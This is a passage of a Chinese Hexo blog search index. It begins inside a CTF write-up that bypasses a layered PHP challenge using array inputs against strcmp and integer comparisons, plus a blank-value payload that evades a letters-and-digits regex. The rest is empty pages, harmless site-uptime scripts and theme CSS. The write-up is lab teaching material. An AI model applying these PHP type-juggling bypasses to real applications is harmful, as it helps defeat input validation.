alt="1"><br>好也过了<br><img src="https://s2.loli.net/2023/10/01/MhKFgRYa8Eu5jxQ.png" alt="1"><br>到第三层了,发现是一个字符比较,但strcmp()函数无法比较数组,所以我继续传个数组<br><img src="https://s2.loli.net/2023/10/01/OPqmvW4wUrHanlT.png" alt="1"><br>果然过了,接下来看看第四层吧<br><img src="https://s2.loli.net/2023/10/01/5DFvHbstpLX1d3V.png" alt="1"><br>第四层发现不能传数字并且值要大于2023,那可以利用php中数组类型一定比整数类型大的特点,我们随便传上一个数组<br><img src="https://s2.loli.net/2023/10/01/C6L85GZiDcfOEAR.png" alt="1"><br>第四层就过了,看看第五层是什么成分<br><img src="https://s2.loli.net/2023/10/01/zaP3JMmIbsOgQXk.png" alt="1"><br>仔细看看,发现这个flag5需要自己传,而且根据前两句函数发现传的post数组中的值和键会被取出当成单独的值,并将这些值和其他post传的参赋给var,之后根据这个正则表达式过滤一切字母和数字<br>那么我们之前传的post参数key3数组里就不能有数字,且之后传的flag5里也不能有数字<br>这样我们可以给key3数组赋任意的符号来绕过这个正则并且第二层的通过也不会失效(因为依旧是数组),而flag5可以考虑通过构造flag5&#x3D;’ ‘这样的payload来绕过正则,且这样的表示也为真,这样if语句执行,flag就展现在眼前了<br><img src="https://s2.loli.net/2023/10/01/9hG3SpflDjHks4E.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>序言</title>
      <link href="/2023/08/25/%E5%BA%8F%E8%A8%80-%E5%BA%8F%E8%A8%80/"/>
      <url>/2023/08/25/%E5%BA%8F%E8%A8%80-%E5%BA%8F%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>这里是总结的一波web安全知识点,欢迎阅读</p><p><a href="https://eihev6cyr3j.feishu.cn/wiki/O508wKnVfi1ixQkgZHJcGAaqnm9?fromScene=spaceOverview">https://eihev6cyr3j.feishu.cn/wiki/O508wKnVfi1ixQkgZHJcGAaqnm9?fromScene=spaceOverview</a></p>]]></content>
      
      
      <categories>
          
          <category> 序言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 序言 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<!-- GitCalendar容器 --><div id="gitZone"> </div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/lib_runtime.js"/>
      <url>/js/lib_runtime.js</url>
      
        <content type="html"><![CDATA[setInterval(() => {  let create_time = Math.round(new Date('2023-8-19 13:34:00').getTime() / 1000); //在此行修改建站时间  let timestamp = Math.round((new Date().getTime()) / 1000);  let second = timestamp - create_time;  let time = new Array(0, 0, 0, 0, 0);  var nol = function(h){    return h>9?h:'0'+h;  }  if (second >= 365 * 24 * 3600) {    time[0] = parseInt(second / (365 * 24 * 3600));    second %= 365 * 24 * 3600;  }  if (second >= 24 * 3600) {    time[1] = parseInt(second / (24 * 3600));    second %= 24 * 3600;  }  if (second >= 3600) {    time[2] = nol(parseInt(second / 3600));    second %= 3600;  }  if (second >= 60) {    time[3] = nol(parseInt(second / 60));    second %= 60;  }  if (second > 0) {    time[4] = nol(second);  }  if ((Number(time[2])<22) && (Number(time[2])>7)){    currentTimeHtml ="<img class='boardsign' src='https://img.shields.io/badge/阎王殿-营业中-6adea8?style=social&logo=cakephp' title='距离第十八层还有不少距离哦'><div id='runtime'>" + time[0] + ' YEAR ' + time[1] + ' DAYS ' + time[2] + ' : ' + time[3] + ' : ' + time[4] + '</div>';  }  else{    currentTimeHtml ="<img class='boardsign' src='https://img.shields.io/badge/阎王殿-打烊了-6adea8?style=social&logo=coffeescript' title='这里的人也是要休息的QWQ'><div id='runtime'>" + time[0] + ' YEAR ' + time[1] + ' DAYS ' + time[2] + ' : ' + time[3] + ' : ' + time[4] + '</div>';  }  document.getElementById("workboard").innerHTML = currentTimeHtml;}, 1000);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime.js"/>
      <url>/js/runtime.js</url>
      
        <content type="html"><![CDATA[var now = new Date; function createtime() { now.setTime(now.getTime() + 1e3); var e = new Date("08/01/2022 00:00:00"), t = Math.trunc(234e8 + (now - e) / 1e3 * 17), a = (t / 1496e5).toFixed(6), o = new Date("08/09/2022 00:00:00"), n = (now - o) / 1e3 / 60 / 60 / 24, r = Math.floor(n), i = (now - o) / 1e3 / 60 / 60 - 24 * r, s = Math.floor(i); 1 == String(s).length && (s = "0" + s); var d = (now - o) / 1e3 / 60 - 1440 * r - 60 * s, l = Math.floor(d); 1 == String(l).length && (l = "0" + l); var g = (now - o) / 1e3 - 86400 * r - 3600 * s - 60 * l, b = Math.round(g); 1 == String(b).length && (b = "0" + b); let c = ""; c = s < 18 && s >= 9 ? `<img class='boardsign' src='https://sourcebucket.s3.ladydaily.com/badge/F小屋-科研摸鱼中.svg' title='什么时候能够实现财富自由呀~'><br> <div style="font-size:13px;font-weight:bold">本站居然运行了 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div>` : `<img class='boardsign' src='https://sourcebucket.s3.ladydaily.com/badge/F小屋-下班休息啦.svg' title='下班了就该开开心心地玩耍~'><br> <div style="font-size:13px;font-weight:bold">本站居然运行了 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div>`, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = c) } setInterval((() => { createtime() }), 1e3);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[:root {  --trans-light: rgba(255, 255, 255, 0.88);  --trans-dark: rgba(25, 25, 25, 0.88);  --border-style: 1px solid rgb(169, 169, 169);  --backdrop-filter: blur(5px) saturate(150%);}/* 页脚与头图透明 */#footer {    background: transparent !important;  }  #page-header {    background: transparent !important;  }    /* 白天模式遮罩透明 */  #footer::before {    background: transparent !important;  }  #page-header::before {    background: transparent !important;  }    /* 夜间模式遮罩透明 */  [data-theme="dark"] #footer::before {    background: transparent !important;  }  [data-theme="dark"] #page-header::before {    background: transparent !important;  }  /* 小冰分类分类磁铁黑夜模式适配 */  /* 一般状态 */  [data-theme="dark"] .magnet_link_context {      background: #1e1e1e;      color: antiquewhite;  }  /* 鼠标悬浮状态 */  [data-theme="dark"] .magnet_link_context:hover {      background: #3ecdf1;      color: #f2f2f2;  }  /* 翻页按钮居中 */  #pagination {    width: 100%;    margin: auto;   }     /* 日间模式不生效 */     [data-theme="light"] #site-name,     [data-theme="light"] #site-title,     [data-theme="light"] #site-subtitle,     [data-theme="light"] #post-info {       animation: none;     }       /* 夜间模式生效 */     [data-theme="dark"] #site-name,     [data-theme="dark"] #site-title {       animation: light_15px 10s linear infinite;     }       [data-theme="dark"] #site-subtitle {       animation: light_10px 10s linear infinite;     }       [data-theme="dark"] #post-info {       animation: light_5px 10s linear infinite;     }       /* 关键帧描述 */     @keyframes light_15px {       0% {         text-shadow: #5636ed 0 0 15px;       }         12.5% {         text-shadow: #11ee5e 0 0 15px;       }         25% {         text-shadow: #f14747 0 0 15px;       }         37.5% {         text-shadow: #f1a247 0 0 15px;       }         50% {         text-shadow: #f1ee47 0 0 15px;       }         50% {         text-shadow: #b347f1 0 0 15px;       }         62.5% {         text-shadow: #002afa 0 0 15px;       }         75% {         text-shadow: #ed709b 0 0 15px;       }         87.5% {         text-shadow: #39c5bb 0 0 15px;       }         100% {         text-shadow: #5636ed 0 0 15px;       }     }       @keyframes light_10px {       0% {         text-shadow: #5636ed 0 0 10px;       }         12.5% {         text-shadow: #11ee5e 0 0 10px;       }         25% {         text-shadow: #f14747 0 0 10px;       }         37.5% {         text-shadow: #f1a247 0 0 10px;       }         50% {         text-shadow: #f1ee47 0 0 10px;       }         50% {         text-shadow: #b347f1 0 0 10px;       }         62.5% {         text-shadow: #002afa 0 0 10px;       }         75% {         text-shadow: #ed709b 0 0 10px;       }         87.5% {         text-shadow: #39c5bb 0 0 10px;       }         100% {         text-shadow: #5636ed 0 0 10px;       }     }       @keyframes light_5px {       0% {         text-shadow: #5636ed 0 0 5px;       }         12.5% {         text-shadow: #11ee5e 0 0 5px;       }         25% {         text-shadow: #f14747 0 0 5px;       }         37.5% {         text-shadow: #f1a247 0 0 15px;       }         50% {         text-shadow: #f1ee47 0 0 5px;       }         50% {         text-shadow: #b347f1 0 0 5px;       }         62.5% {         text-shadow: #002afa 0 0 5px;       }         75% {         text-shadow: #ed709b 0 0 5px;       }         87.5% {         text-shadow: #39c5bb 0 0 5px;       }         100% {         text-shadow: #5636ed 0 0 5px;       }     }         /* 侧边栏个人信息卡片动态渐变色 */         #aside-content>.card-widget.card-info {           background: linear-gradient(-45deg,               #e8d8b9,               #eccec5,               #a3e9eb,               #bdbdf0,               #eec1ea);           box-shadow: 0 0 5px rgb(66, 68, 68);           position: relative;           background-size: 400% 400%;           -webkit-animation: Gradient 10s ease infinite;           -moz-animation: Gradient 10s ease infinite;           animation: Gradient 10s ease infinite !important;         }             @-webkit-keyframes Gradient {           0% {             background-position: 0% 50%;           }               50% {             background-position: 100% 50%;           }               100% {             background-position: 0% 50%;           }         }             @-moz-keyframes Gradient {           0% {             background-position: 0% 50%;           }               50% {             background-position: 100% 50%;           }               100% {             background-position: 0% 50%;           }         }             @keyframes Gradient {           0% {             background-position: 0% 50%;           }               50% {             background-position: 100% 50%;           }               100% {             background-position: 0% 50%;           }         }             /* 黑夜模式适配 */         [data-theme="dark"] #aside-content>.card-widget.card-info {           background: #191919ee;         }             /* 个人信息Follow me按钮 */         #aside-content>.card-widget.card-info>#card-info-btn {           background-color: #3eb8be;           border-radius: 8px;         }/* 首页文章卡片 */#recent-posts>.recent-post-item {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 25px;  border: var(--border-style);}/* 首页侧栏卡片 */#aside-content .card-widget {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 18px;  border: var(--border-style);}/* 文章页、归档页、普通页面 */div#post,div#page,div#archive {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border: var(--border-style);  border-radius: 20px;}/* 导航栏 */#page-header.nav-fixed #nav {  background: rgba(255, 255, 255, 0.75);  backdrop-filter: var(--backdrop-filter);}[data-theme="dark"] #page-header.nav-fixed #nav {  background: rgba(0, 0, 0, 0.7) !important;}/* 夜间模式遮罩 */[data-theme="dark"] #recent-posts>.recent-post-item,[data-theme="dark"] #aside-content .card-widget,[data-theme="dark"] div#post,[data-theme="dark"] div#archive,[data-theme="dark"] div#page {  background: var(--trans-dark);}/* 夜间模式页脚页头遮罩透明 */[data-theme="dark"] #footer::before {  background: transparent !important;}[data-theme="dark"] #page-header::before {  background: transparent !important;}/* 阅读模式 */.read-mode #aside-content .card-widget {  background: rgba(158, 204, 171, 0.5) !important;}.read-mode div#post {  background: rgba(158, 204, 171, 0.5) !important;}/* 夜间模式下的阅读模式 */[data-theme="dark"] .read-mode #aside-content .card-widget {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}[data-theme="dark"] .read-mode div#post {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}/* Twikoo 评论样式 */.tk-input .el-textarea__inner {  min-height: 120px !important;}#twikoo .OwO-body {  max-width: 100% !important;}#twikoo .OwO .OwO-body .OwO-items:nth-child(1),#twikoo .OwO .OwO-body .OwO-items:nth-child(4) {  max-height: 360px !important;}#twikoo .OwO-items li[title|=menhera] img {  width: 100% !important;  margin: 5px 10px;}.tk-comment .tk-owo-emotion[alt*=menhera] {  width: 300px !important;}.tk-comment .vemoji[alt|=menhera],.tk-comment .tk-owo-emotion[alt*=menhera] {  max-width: 300px !important;  max-height: 300px !important;  margin: 8px 1px;  display: block !important;}@media screen and (max-width: 768px) {  .tk-comment .vemoji[alt|=menhera],  .tk-comment .tk-owo-emotion[alt*=menhera] {    max-width: calc(100% - 30px) !important;    max-height: calc(100% - 30px) !important;  }  .OwO .OwO-body .OwO-items-image .OwO-item[title*=menhera] {    max-width: calc(50% - 10px);    box-sizing: border-box;  }}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>电影</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标题</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>音乐</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
